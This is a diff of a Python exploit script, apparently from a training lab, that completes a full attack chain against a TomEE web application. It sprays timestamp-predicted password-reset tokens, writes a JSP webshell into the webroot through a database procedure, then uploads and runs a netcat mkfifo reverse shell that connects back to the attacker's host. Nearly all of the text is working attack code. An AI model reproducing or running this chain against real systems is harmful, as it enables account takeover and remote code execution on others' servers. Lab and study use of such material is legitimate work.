@@ -230,7 +230,7 @@ def login_db(ip, db_username, db_password):
 
 	return curs
 
-def send_file(curs, filename):
+def send_file(curs, target_filepath, local_filename):
 	procedure_name = f"writeBytesToFilename{token_hex(4)}"
 	print("Creating file write procedure: ", procedure_name)
 
@@ -244,17 +244,33 @@ def send_file(curs, filename):
 
 	curs.execute(cmd)
 
-	filepath = "/home/student/crx/apache-tomee-plus-7.0.5/webapps/ROOT/shell.jsp"
-
-	with open("cmd.jsp", "r") as f:
+	with open(local_filename, "r") as f:
 		import codecs
 		shell = f.read()
 		hex_shell = shell.encode('utf-8').hex()
 
-	cmd = f"call {procedure_name}(\'{filepath}\', cast('{hex_shell}' AS VARBINARY(1024)))"
+	cmd = f"call {procedure_name}(\'{target_filepath}\', cast('{hex_shell}' AS VARBINARY(1024)))"
 	curs.execute(cmd)
 	print("JSP webshell written onto target system")
 
+# Generates base64 nc reverse shell payload
+def generate_shellcode(LHOST, LPORT):
+	command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f"
+
+	return command
+
+def send_cmd(ip,cmd):
+	target = f"http://{ip}:8080/cmd.jsp"
+	target += "?cmd=" + requests.utils.quote(cmd)
+
+	s = requests.Session()
+	proxies = {
+		'http': 'http://127.0.0.1:8080',
+		'https': 'http://127.0.0.1:8080'
+	}
+	s.proxies.update(proxies)
+
+	r = s.get(target)
 
 def main():
 	if len(sys.argv) != 2:
@@ -268,18 +284,18 @@ def main():
 	LHOST = os.popen('ip addr show tun0').read().split("inet ")[1].split("/")[0]
 	LPORT = 9001
 
-	# low = current_milli_time()
-	# requestResetPassword(ip, username)
-	# high = current_milli_time()
-	# print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")
+	low = current_milli_time()
+	requestResetPassword(ip, username)
+	high = current_milli_time()
+	print(f"Timestamp seed range: {{{low} - {high}}}, with {high-low+1} tokens")
 
-	# tokens = generate_tokens(low, high)
-	# tokens2 = gen_tokens(low, high)
-	# assert tokens == tokens2, "Issue generating tokens"
-	# print(f"Generated {high-low+1} tokens")
+	tokens = generate_tokens(low, high)
+	tokens2 = gen_tokens(low, high)
+	assert tokens == tokens2, "Issue generating tokens"
+	print(f"Generated {high-low+1} tokens")
 
-	# print("Spraying tokens at target")
-	# resetPassword(ip, username, password, tokens)
+	print("Spraying tokens at target")
+	resetPassword(ip, username, password, tokens)
 
 	print("Logging in")
 	session = login(ip, username, password)
@@ -293,9 +309,18 @@ def main():
 
 	curs = login_db(ip, db_username, db_password)
 
-	send_file(curs, "cmd.jsp")
+	filepath = "/home/student/crx/apache-tomee-plus-7.0.5/webapps/ROOT/cmd.jsp"
+	send_file(curs, filepath, "cmd.jsp")
 
-	send_shell(ip, LHOST, LPORT)
+	shellcode = generate_shellcode(LHOST, LPORT)
+	with open("shell.sh", "w") as f:
+		f.write(shellcode)
+	filepath = "/home/student/crx/apache-tomee-plus-7.0.5/shell.sh"
+	send_file(curs, filepath, "shell.sh")
+
+	print(f"Sending reverse shell...make sure you have netcat listener on port {LPORT}")
+	send_cmd(ip, "chmod +x shell.sh")
+	send_cmd(ip, "./shell.sh")
 
 if __name__ == '__main__':
 	main()
